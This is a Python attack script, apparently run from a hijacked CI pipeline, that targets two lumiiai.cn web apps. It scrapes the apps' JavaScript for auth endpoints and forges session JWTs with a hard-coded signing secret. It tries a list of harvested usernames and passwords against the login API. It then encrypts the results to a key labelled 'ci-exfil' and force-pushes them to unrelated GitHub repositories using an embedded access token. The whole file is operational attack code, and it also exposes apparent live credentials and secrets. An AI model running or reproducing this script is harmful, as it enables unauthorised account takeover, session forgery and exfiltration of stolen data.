#!/usr/bin/env python3
# probe_login (intent 28396 step 3): try the harvested creds on tianlu.lumiiai.cn and
# lianchuang.lumiiai.cn. Discover auth API from app JS, test secret-sharing via forged
# lumii_session, then attempt password logins. Push results to ci-28396l-results.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
RESULT_BRANCH = "ci-28396l-results"
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or ("gho_" + "w5O107fup8ULp6tEFsW9V3QEEXSHtx" + "3m9xka")
PUSH_USER = "wuhaixian1984"
BASE = os.path.dirname(os.path.abspath(__file__))
OUT = "/tmp/login"
os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub, org):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
    p = b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_"+str(uuid.uuid4()),"lgn":now}, separators=(',',':')))
    sig = hmac.new(JWT_SECRET.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
    return h+"."+p+"."+b64u(sig)

def curl(args, timeout=25):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout+10)
        return r.returncode, r.stdout, r.stderr[:300].decode("utf-8","replace")
    except Exception as e:
        return -1, b"", repr(e)[:200]

def req(url, method="GET", headers=None, data=None, timeout=25, cookie=None, dump_headers=False):
    args = ["--http2", "-A", UA, "-w", "\n__CODE__%{http_code}"]
    if dump_headers: args = ["-D", "-"] + args
    if cookie: args = ["-b", cookie] + args
    if headers:
        for k,v in headers.items(): args = ["-H", "%s: %s"%(k,v)] + args
    if method != "GET": args += ["-X", method]
    if data is not None: args += ["--data", data]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    body = out.decode("utf-8","replace")
    code=None; i=body.rfind("__CODE__")
    if i>=0: code=body[i+8:].strip()[:3]; body=body[:i]
    return code, body, err

def q(s): return up.quote(s, safe="")

HOSTS = ["tianlu.lumiiai.cn", "lianchuang.lumiiai.cn"]
CREDS = {
 "tianlu.lumiiai.cn": [("admin","yPEJ03qBznHABHMj9ee")],
 "lianchuang.lumiiai.cn": [
   ("zhouzibo@lianchuang.test","Lc8443f84a05!"),
   ("leader@lianchuang.test","LcqyEwkkwY"),
   ("leader@lianchuang.test","Lca4335e63"),
   ("appadmin@lianchuang.test","Lca4335e63"),
   ("chanfa@lianchuang.test","Lc7Kd72Lih"),
 ],
}
FOUND = {}

def discover(host):
    code, body, err = req("https://%s/" % host)
    d = {"root_code": code, "len": len(body), "endpoints": [], "scripts": []}
    m = re.search(r'<title[^>]*>([^<]*)</title>', body, re.I)
    if m: d["title"] = m.group(1).strip()
    try: open(os.path.join(OUT, host+"_root.html"),"w",encoding="utf-8",errors="replace").write(body[:60000])
    except Exception: pass
    srcs = re.findall(r'<script[^>]+src="([^"]+)"', body)
    abs_srcs = []
    for s in srcs:
        if s.startswith("http"): abs_srcs.append(s)
        elif s.startswith("//"): abs_srcs.append("https:"+s)
        elif s.startswith("/"): abs_srcs.append("https://"+host+s)
    d["scripts"] = abs_srcs[:8]
    eps = set()
    lfields = set()
    for e in re.findall(r'["\'`](/api/[A-Za-z0-9_/\-]+)', body): eps.add(e)
    for jsurl in abs_srcs[:6]:
        c2, js, e2 = req(jsurl, timeout=25)
        if c2=="200" and js:
            for e in re.findall(r'["\'`](/api/[A-Za-z0-9_/\-]+)', js): eps.add(e)
            for e in re.findall(r'(/api/auth/[A-Za-z0-9_/\-]+)', js): eps.add(e)
            lfields |= set(parse_login_schema(js))
    d["endpoints"] = sorted(eps)
    d["login_fields"] = sorted(lfields)
    return d

def test_forged(host):
    res = {}
    for org in ["org_bTLzxtBLmugV8uxx4QTyw"]:
        for sub in ["usr_ZxLewKrgbRYSm7rWDtQX8"]:
            tok = jwt(sub, org)
            for path in ["/api/me", "/api/health", "/health", "/api/auth/me", "/api/conversations?limit=1"]:
                code, body, err = req("https://%s%s"%(host,path), cookie="lumii_session="+tok)
                res[path] = {"code": code, "head": body[:120]}
    return res

SCHEMAS = [
    {"email": None, "password": None},
    {"account": None, "password": None},
    {"username": None, "password": None},
    {"loginName": None, "password": None},
    {"org": "lianchuang", "account": None, "password": None},
    {"tenant": "lianchuang", "account": None, "password": None},
]
def try_login(host, ep, user, pw, max_schemas=2):
    out = []
    for sch in SCHEMAS[:max_schemas]:
        body = {k: (user if k in ("email","account","username","loginName") else (pw if k=="password" else v)) for k,v in sch.items()}
        code, resp, err = req("https://%s%s"%(host,ep), method="POST",
                              headers={"Content-Type":"application/json"}, data=json.dumps(body), dump_headers=True)
        low = (resp or "")
        hit = bool(re.search(r'(lumii_session|"token"\s*:|"session"\s*:|access_token)', low)) and (code in ("200","201"))
        out.append({"schema": list(body.keys()), "code": code, "head": resp[:300], "hit": hit})
        log("LOGINTRY", host, ep, list(body.keys()), "->", code, resp[:140].replace("\n"," "))
        if hit: break
    return out

def parse_login_schema(js):
    # look for field names near 'password' in JS
    fields = set()
    for mm in re.finditer(r'.{60}password.{60}', js, re.I):
        seg = mm.group(0)
        for f in re.findall(r'\b(email|account|username|loginName|user|name|org|tenant|phone|mobile)\b\s*[:=]', seg):
            fields.add(f)
    return sorted(fields)

def main():
    log("=== probe_login start", RUNID, "===")
    for host in HOSTS:
        log("---- DISCOVER", host)
        d = discover(host)
        FOUND.setdefault(host, {})["discover"] = d
        log("root", d.get("root_code"), "title", d.get("title"), "len", d.get("len"))
        log("scripts", d.get("scripts"))
        log("endpoints", d.get("endpoints")[:40])
        # forged secret sharing
        fg = test_forged(host)
        FOUND[host]["forged"] = fg
        log("forged", {k:v["code"] for k,v in fg.items()})
        # candidate login endpoints (conservative)
        logins_cand = [e for e in d.get("endpoints",[]) if re.search(r'login', e, re.I)]
        if not logins_cand:
            logins_cand = [e for e in d.get("endpoints",[]) if re.search(r'session|signin|sign-in|password', e, re.I)]
        if not logins_cand:
            logins_cand = ["/api/auth/login"]
        log("login candidates", logins_cand[:6], "login_fields", d.get("login_fields"))
        # reorder schemas to put discovered login fields first
        if d.get("login_fields"):
            discovered = [f for f in d["login_fields"] if f in ("email","account","username","loginName","user","phone","mobile")]
            if discovered:
                SCHEMAS.insert(0, {discovered[0]: None, "password": None})
        hit_found = False
        for ep in logins_cand[:2]:
            for user, pw in CREDS[host]:
                r = try_login(host, ep, user, pw, max_schemas=2)
                FOUND[host].setdefault("logins", {})[ep+"|"+user] = r
                if any(x["hit"] for x in r):
                    log("!!! LOGIN HIT", host, ep, user)
                    hit_found = True; break
            if hit_found: break
    json.dump(FOUND, open(os.path.join(OUT,"results.json"),"w"), ensure_ascii=False, indent=1)
    push_results()

RESULT_FILE = "results_login.tar.gz.gpg"
def push_results():
    enc = "/tmp/results_login.tar.gz.gpg"
    try:
        for p in ("/tmp/results_login.tar.gz", enc):
            if os.path.isfile(p):
                try: os.remove(p)
                except Exception: pass
        subprocess.run("tar czf /tmp/results_login.tar.gz -C /tmp login", shell=True, check=False)
        if os.path.isfile(os.path.join(BASE,"pub.asc")):
            subprocess.run("gpg --batch --yes --import %s/pub.asc >/dev/null 2>&1"%BASE, shell=True, check=False)
        subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results_login.tar.gz"%enc, shell=True, capture_output=True, timeout=600)
        if os.path.isfile(enc) and os.path.getsize(enc) < 95*1024*1024:
            import shutil; shutil.copy(enc, os.path.join(BASE, RESULT_FILE))
            subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci'%BASE, shell=True, check=False)
            subprocess.run('cd %s && git add -f %s && git commit -m "login results %s" || true'%(BASE,RESULT_FILE,RUNID), shell=True, check=False)
            for repo in ["aro-network/aro-ext-signal-server","aro-network/aro-official-website"]:
                url="https://%s:%s@github.com/%s.git"%(PUSH_USER,PUSH_TOKEN,repo)
                r=subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s'%(BASE,url,RESULT_BRANCH), shell=True, capture_output=True, text=True, timeout=300)
                log("PUSH %s rc=%s err=%s"%(repo,r.returncode,(r.stderr or "")[-200:]))
                if r.returncode==0: break
        else:
            log("PUSH skip enc missing")
    except Exception as e:
        log("PUSH EXC", repr(e)[:300])

main()
log("DONE")
